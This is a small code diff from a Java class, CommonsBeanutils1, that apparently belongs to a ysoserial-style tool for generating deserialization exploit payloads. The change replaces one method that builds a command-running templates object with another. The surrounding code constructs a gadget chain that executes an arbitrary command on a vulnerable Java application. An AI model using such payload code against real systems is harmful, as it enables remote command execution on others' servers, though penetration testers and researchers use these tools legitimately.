@@ -19,7 +19,7 @@ public class CommonsBeanutils1 implements CommandObjectPayload<Object>
 {
 
     public Object getObject(final String command) throws Exception {
-        final Object templates = Gadgets.createTemplatesImpl(command);
+        final Object templates = Gadgets.createTemplates4Cmd(command);
         // mock method name until armed
         final BeanComparator comparator = new BeanComparator("lowestSetBit");
 
